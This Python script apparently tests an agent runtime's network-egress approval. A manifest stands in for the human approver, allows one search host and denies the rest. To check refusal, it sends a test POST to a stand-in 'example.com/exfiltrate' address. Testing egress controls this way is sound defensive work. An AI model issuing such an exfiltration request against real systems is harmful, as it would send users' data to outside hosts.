"""Egress through the approver: the security story a benchmark is scored on.

``net.http`` is UNSAFE, so a search reaches the network only if somebody says
yes. Here a manifest stands in for the person: it allows one host and refuses
everything else, which is precisely what an injection task tests.
"""
import json
import threading
import time
import urllib.error
import urllib.request

BASE, TOKEN, THREAD = "http://127.0.0.1:8787", "benchtoken", "main"
ALLOWED_HOSTS = {"html.duckduckgo.com"}
frames, decisions = [], []


def post(kind, args=None, timeout=120):
    req = urllib.request.Request(
        f"{BASE}/sdk/{kind}?thread={THREAD}",
        data=json.dumps(args or {}).encode(), method="POST",
        headers={"Authorization": f"Bearer {TOKEN}",
                 "Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, json.loads(r.read() or b"{}")
    except urllib.error.HTTPError as e:
        return e.code, json.loads(e.read() or b"{}")


def stream():
    req = urllib.request.Request(
        f"{BASE}/events?thread={THREAD}&token={TOKEN}",
        headers={"Authorization": f"Bearer {TOKEN}"})
    r = urllib.request.urlopen(req, timeout=300)
    while True:
        raw = r.readline()
        if not raw:
            return
        line = raw.decode(errors="replace").strip()
        if line.startswith("data:"):
            try:
                frames.append(json.loads(line[5:].strip()))
            except json.JSONDecodeError:
                pass


def manifest(detail):
    """Allow only what the task legitimately needs. Data, never prose."""
    if detail.get("type") != "net.http":
        return "deny"
    host = urllib.request.urlparse(detail.get("url", "")).hostname or ""
    return "allow" if host in ALLOWED_HOSTS else "deny"


def approver():
    seen = set()
    while True:
        for f in list(frames):
            if f.get("kind") != "approval":
                continue
            payload = f.get("payload") or {}
            rid = payload.get("id")
            if rid in seen:
                continue
            seen.add(rid)
            detail = payload.get("detail") or {}
            choice = manifest(detail)
            decisions.append((detail.get("url"), choice))
            print(f"   [manifest] {detail.get('type')} "
                  f"{detail.get('url')} -> {choice}", flush=True)
            post("frontend.resolve", {"value": choice, "request_id": rid})
        time.sleep(0.15)


threading.Thread(target=stream, daemon=True).start()
time.sleep(1.0)
post("frontend.submit", {"input_kind": "text", "text": "/locations"})
time.sleep(2.0)
threading.Thread(target=approver, daemon=True).start()

print("== allowed host ==")
status, answer = post("service.call",
                      {"name": "web_search_provider",
                       "method": "duckduckgo_search",
                       "kwargs": {"query": "microkernel architecture",
                                  "count": 3}})
data = answer.get("data") or {}
print(f"   -> {status}, results: {len(data.get('results') or [])}")
for row in (data.get("results") or [])[:3]:
    print(f"      - {str(row.get('title'))[:65]}")
if status != 200:
    print(f"      err: {json.dumps(answer)[:200]}")

print("== a host the manifest does not allow ==")
status, answer = post("net.http", {"url": "https://example.com/exfiltrate",
                                   "method": "POST"})
print(f"   -> {status} {json.dumps(answer)[:150]}")
print(f"== decisions: {decisions} ==")
